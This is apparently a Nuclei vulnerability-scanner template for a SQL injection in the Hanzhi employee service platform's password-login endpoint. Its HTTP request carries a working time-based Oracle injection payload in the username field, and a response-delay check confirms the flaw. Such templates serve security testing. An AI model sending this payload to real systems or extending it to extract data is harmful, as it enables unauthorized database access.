id: yuangongzizhu-loginByPassword-sqli

info:
  name: Template Name
  author: apple
  severity: high
  description: 翰智员工服务平台登录接口loginByPassword处userName参数未对传入的数据进行严格校验和过滤，导致造成SQL注入漏洞，未经身份验证的远程攻击者可利用此漏洞获取数据库敏感信息。
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%BF%B0%E6%99%BA%E5%91%98%E5%B7%A5%E6%9C%8D%E5%8A%A1%E5%B9%B3%E5%8F%B0loginByPassword%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: tags

http:
  - raw:
      - |-
        POST /hrssc/portal/plantform/loginByPassword HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
        Accept: application/json, text/plain, */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br, zstd
        Content-Type: application/json
        Connection: keep-alive
        Priority: u=1
        Content-Length: 180

        {"userName":"'||(SELECT CHR(97)||CHR(122)||CHR(85)||CHR(72) FROM DUAL WHERE 7673=7673 AND 7374=DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(72)||CHR(114)||CHR(99),5))||'","password":"'"}
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"